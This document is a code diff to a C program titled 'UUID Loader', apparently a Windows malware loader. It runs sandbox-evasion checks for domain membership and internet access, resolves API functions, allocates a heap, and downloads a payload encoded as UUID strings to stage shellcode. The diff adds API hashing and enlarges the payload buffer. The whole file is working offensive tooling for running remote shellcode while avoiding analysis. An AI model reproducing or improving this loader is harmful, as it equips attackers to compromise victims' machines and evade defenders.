@@ -1,9 +1,17 @@
+/*
+UUID Loader
+Author - 0xpwnisher
+*/
+
+
 #include "headers.h"
 #include "checks.h"
+#include "apiresolv.h"
 #include "downloader.h"
 
 #pragma comment(lib, "Rpcrt4.lib")
 
+#define HASH_KERNEL32 0x16a58fe2
 
 
 typedef HANDLE(WINAPI* _HeapCreate)(
@@ -41,6 +49,9 @@ typedef BOOL(WINAPI* _SetProcessMitigationPolicy)(
     SIZE_T dwLength
 );
 
+typedef HMODULE(WINAPI* _pLoadLibraryA)(
+    _In_ LPCSTR lpLibFileName
+    );
 
 
 DWORD dllpolicy() {
@@ -78,20 +89,27 @@ DWORD codepolicy() {
 int main()
 {
 
+    // all safety checks must happen here else just return 
+    
+    if (!DomainCheck()|| !checkinternet()) {
 
-    DomainCheck();
+        return 0;
+    }
 
-    printf("INitialize Loader\n");
-
-    dllpolicy();
   
+    printf(" [*] All Safety Checks Passed\n");
+    printf(" [*] Initializing Staging\n");
 
 
-
+    // Two optional features 
+     dllpolicy();
+   // codepolicy();
+   
     HMODULE rpcdll = GetModuleHandleA("Rpcrt4.dll");
     
     HMODULE Hmod = GetModuleHandleA("Kernel32.dll");
 
+    
     _HeapCreate HeapC = (_HeapCreate)GetProcAddress(Hmod, "HeapCreate");
     _HeapAlloc HeapAC = (_HeapAlloc)GetProcAddress(Hmod, "HeapAlloc");
     _EnSysLocal ensys = (_EnSysLocal)GetProcAddress(Hmod, "EnumSystemLocalesA");
@@ -103,22 +121,19 @@ int main()
     void* ha = HeapAC(hc, 0, 0x100000);
     DWORD_PTR hptr = (DWORD_PTR)ha;
 
-    // update policy to avoid RWX after our heap creates lol
-    codepolicy();
-
     
-
+    // all good proceed to staging shellcode
     char* buf = download();    
 
-    printf("Outout: %s\n", buf);
+   // printf("Outout: %s\n", buf);
 
     char* p2str;
-    char* uuids[32];
+    char* uuids[50000];
     char* token;
 
     token = strtok_s(buf, "\n", &p2str);
 
-    printf("Tken: %s\n", token);
+ //   printf("Token: %s\n", token);
 
    
     int i = 0;
@@ -130,16 +145,19 @@ int main()
         }
     }
 
+  //  printf("Value if i : %d", i);
+
+
     int elems = i;
     for (int i = 0; i < elems; i++) {
-        printf("[+] Token '%d' - %s\n", i, uuids[i]);
+    //    printf("[+] Token '%d' - %s\n", i, uuids[i]);
     }
 
 
+  
+  //  printf("length : %d\n", sizeof(uuids));
 
-    printf("length : %d\n", sizeof(uuids));
-
-    printf("first: %s\n", uuids[0]);
+   // printf("first: %s\n", uuids[0]);
 
 
     for (int i = 0; i < elems; i++) {
@@ -155,7 +173,7 @@ int main()
     }
 
 
-    printf("[*] Hexdump: ");
+    printf(" [*] Hexdump: ");
     for (int i = 0; i < elems * 16; i++) {
         printf("%02X ", ((unsigned char*)ha)[i]);
     }
